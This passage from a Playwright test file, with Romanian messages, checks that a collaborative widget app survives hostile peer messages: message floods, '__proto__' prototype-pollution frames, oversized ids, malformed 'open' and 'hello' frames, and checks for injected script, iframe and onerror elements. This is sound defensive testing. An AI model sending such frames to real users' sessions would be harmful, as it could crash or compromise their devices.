    for (let i = 0; i < 6000; i++) frames.push(env({k: 'n+', n: {id: 1000 + i, by: 'p9', name: 'N', c: '', x: 'inundatie ' + i}}));
    for (let i = 0; i < 3000; i++) frames.push({t: 'roster', peers: [{id: 'p1', name: 'N' + i, color: '#0072B2', locked: false}]});
    ok((await rawSend(H.page, frames)) > 0, 'nu există canal de date');
    await sleep(2500);
    ok(await Promise.race([G.page.evaluate(() => 1), sleep(5000).then(() => 0)]), 'telefonul nu mai răspunde');
    const probe = await G.page.evaluate(() => ({polluted: ({}).polluted, x: window.__x, imgs: document.querySelectorAll('img').length, scripts: document.querySelectorAll('.pf-live script').length}));
    eq(probe.polluted, undefined); eq(probe.x, undefined); eq(probe.imgs, 0); eq(probe.scripts, 0);
    let f = await frameOf(G); ok(f, 'cadrul widgetului a dispărut de pe telefon după cadre care nu cer închiderea activității');
    let fp = await f.evaluate(() => ({img: document.querySelectorAll('#root img, #root script, #root iframe, #root object, #root embed, #root [onerror], #root [onload]').length, x: window.__x, pol: ({}).polluted, n: document.querySelectorAll('.nt-note').length}));
    eq(fp.img, 0, 'element injectat în widget'); eq(fp.x, undefined); eq(fp.pol, undefined); ok(fp.n >= 2 && fp.n <= 300, 'lista de notițe: ' + fp.n + ' (limita widgetului este 300; ≥2 = cadrele au fost procesate)');
    // telefonul rămâne conectat la gazda reală și își păstrează identitatea
    const gf = await frameOf(G); await gf.fill('#nt-ta', 'sunt încă aici'); await gf.click('text=Add note');
    await untilIn(H, () => /sunt încă aici/.test(document.getElementById('root').innerText), null, 'telefonul a pierdut legătura sau identitatea după cadrele ostile');
    // 3) «open» malformate sau către widgeturi inexistente: gazda are autoritate asupra activității, deci telefonul poate rămâne fără activitate, dar nu se strică și gazda reală îl readuce
    await rawSend(H.page, [{t: 'open', w: '__proto__', n}, {t: 'open', w: 'x'.repeat(5000), n}, {t: 'open', w: 'quiz', n: 'x'}, {t: 'open', w: {a: 1}, n: [1]}, {t: 'close'}, {t: 'close', w: 5}]);
    await sleep(800);
    ok(await Promise.race([G.page.evaluate(() => 1), sleep(5000).then(() => 0)]), 'telefonul nu mai răspunde după «open» malformate');
    eq(await G.page.evaluate(() => ({}).polluted), undefined, 'poluare de prototip');
    await H.page.click('[data-fid=a-notes]'); await H.page.waitForSelector('[data-fid=a-notes]');         // «închide» activitatea la gazdă (pentru toți)
    await untilIn(H, () => !!document.getElementById('root'), null, 'x', 500).catch(() => {});
    for (let i = 0; i < 6; i++) { const lab = await H.page.$eval('[data-fid=a-notes]', (b) => b.getAttribute('aria-label') || b.textContent); if (/Open|Deschide|Ouvrir|Öffnen|Abrir|Apri|Abrir|Megnyit/i.test(lab)) break; await sleep(300); }
    await H.page.click('[data-fid=a-notes]');                                                                  // deschide din nou, cu un număr nou de activitate
    await G.page.waitForSelector('.pf-frame', {timeout: 12000});
    await untilIn(G, () => !!document.getElementById('nt-ta'), null, 'activitatea nu a revenit pe telefon după redeschiderea de la gazda reală');
    // 4) «hello» invalid (protocol): telefonul încheie sesiunea curat, cu mesajul de versiune diferită, fără excepții; gazda reală vede plecarea
    await rawSend(H.page, [{t: 'hello', p: 1, you: {id: 'p' + 'x'.repeat(500), name: 'a'}, peers: []}]);
    await G.page.waitForSelector('.pf-live', {state: 'detached', timeout: 8000});
    ok(/different version|altă versiune|autre version|andere Version|otra versión|altra versione|outra versão|másik verzió/i.test(await G.page.textContent('#appmount')), 'mesajul de protocol lipsește: ' + (await G.page.textContent('#appmount')).slice(0, 160));
    await H.page.waitForFunction(() => document.querySelectorAll('.pf-peer').length === 0, null, {timeout: 10000});
    ok(!G.errors.some((e) => /pageerror/.test(e)), G.errors.join(' | ')); ok(G.net.length === 0 && H.net.length === 0, 'rețea');
  });
}

browser = await chromium.launch({executablePath: process.env.CHROMIUM_PATH || '/opt/pw-browsers/chromium', args: FLAGS});
try {
  await partA();
  await partB();
  await partC();
  await partD();
} finally {
  await browser.close();
  if (EVIL_APP) fs.rmSync(path.dirname(EVIL_APP), {recursive: true, force: true});
}
const fail = results.filter((r) => !r[1]).length;
console.log(`\n${results.length - fail}/${results.length} teste trec`);
process.exit(fail ? 1 : 0);
